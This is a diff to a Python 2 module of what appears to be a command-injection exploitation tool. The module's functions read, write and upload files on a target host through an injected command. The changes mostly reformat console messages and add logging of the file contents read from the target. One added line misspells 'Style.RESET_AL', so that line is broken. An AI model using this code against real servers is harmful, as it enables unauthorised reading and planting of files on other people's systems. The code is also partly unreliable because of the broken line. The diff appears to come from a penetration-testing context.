@@ -37,15 +37,18 @@ def file_read(separator, TAG, prefix, suffix, http_request_method, url, vuln_par
   cmd = "(" + settings.FILE_READ + file_to_read + ")"
   response = eb_injector.injection(separator, TAG, cmd, prefix, suffix, http_request_method, url, vuln_parameter, filename)
   shell = eb_injector.injection_results(response, TAG)
-  shell = "".join(str(p) for p in shell).replace(" ", "", 1)[:-1]
+  shell = "".join(str(p) for p in shell).replace(" ", "", 1)
+  if menu.options.verbose:
+    print ""
   if shell:
-    if menu.options.verbose:
-      print ""
-    sys.stdout.write(Style.BRIGHT + "(!) Contents of file " + Style.UNDERLINE + file_to_read + Style.RESET_ALL + " : ")
+    sys.stdout.write(Style.BRIGHT + "(!) The contents of file '" + Style.UNDERLINE + file_to_read + Style.RESET_ALL + "' : ")
     sys.stdout.flush()
     print shell
+    output_file = open(filename, "a")
+    output_file.write("    (!) The contents of file '" + file_to_read + "' : " + shell + ".\n")
+    output_file.close()
   else:
-   sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '"+ file_to_read + "' file." + Style.RESET_ALL)
+   sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you don't have permissions to read the '"+ file_to_read + "' file." + Style.RESET_ALL + "\n")
    sys.stdout.flush()
 
 
@@ -55,7 +58,7 @@ Write to a file on the target host.
 def file_write(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename):
   file_to_write = menu.options.file_write
   if not os.path.exists(file_to_write):
-    sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL)
+    sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_write + "' file, does not exists." + Style.RESET_ALL + "\n")
     sys.stdout.flush()
     sys.exit(0)
     
@@ -64,7 +67,7 @@ def file_write(separator, TAG, prefix, suffix, http_request_method, url, vuln_pa
       content = [line.replace("\n", " ") for line in content_file]
     content = "".join(str(p) for p in content).replace("'", "\"")
   else:
-    sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that '"+ file_to_write + "' is not a file." + Style.RESET_ALL)
+    sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that '"+ file_to_write + "' is not a file." + Style.RESET_ALL)
     sys.stdout.flush()
     
   # Check the file-destination
@@ -90,10 +93,10 @@ def file_write(separator, TAG, prefix, suffix, http_request_method, url, vuln_pa
   if shell:
     if menu.options.verbose:
       print ""
-    sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!\n" + Style.RESET_ALL)
+    sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was created successfully!" + Style.RESET_AL + "\n")
     sys.stdout.flush()
   else:
-   sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you can't create the '"+ dest_to_write + "' file." + Style.RESET_ALL + "\n")
+   sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you can't create the '"+ dest_to_write + "' file." + Style.RESET_ALL + "\n")
    sys.stdout.flush()
 
 
@@ -107,7 +110,7 @@ def file_upload(separator, TAG, prefix, suffix, http_request_method, url, vuln_p
   try:
     urllib2.urlopen(file_to_upload)
   except urllib2.HTTPError, err:
-    sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_upload + "' file, does not exists. ("+str(err)+")" + Style.RESET_ALL + "\n")
+    sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that the '"+ file_to_upload + "' file, does not exists. ("+str(err)+")" + Style.RESET_ALL + "\n")
     sys.stdout.flush()
     sys.exit(0)
     
@@ -134,10 +137,10 @@ def file_upload(separator, TAG, prefix, suffix, http_request_method, url, vuln_p
   if shell:
     if menu.options.verbose:
       print ""
-    sys.stdout.write(Style.BRIGHT + "\n(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was uploaded successfully!\n" + Style.RESET_ALL)
+    sys.stdout.write(Style.BRIGHT + "(!) The " + Style.UNDERLINE + shell + Style.RESET_ALL + Style.BRIGHT +" file was uploaded successfully!" + Style.RESET_ALL + "\n")
     sys.stdout.flush()
   else:
-   sys.stdout.write("\n" + Fore.YELLOW + "(^) Warning: It seems that you can't upload the '"+ dest_to_upload + "' file." + Style.RESET_ALL + "\n")
+   sys.stdout.write(Fore.YELLOW + "(^) Warning: It seems that you can't upload the '"+ dest_to_upload + "' file." + Style.RESET_ALL + "\n")
    sys.stdout.flush()
 
 
@@ -157,7 +160,7 @@ def do_check(separator, TAG, prefix, suffix, http_request_method, url, vuln_para
     file_upload(separator, TAG, prefix, suffix, http_request_method, url, vuln_parameter, filename)
     settings.FILE_ACCESS_DONE = True
 
-  if settings.FILE_ACCESS_DONE == True:
+  if settings.FILE_ACCESS_DONE:
     print ""
 
 # eof
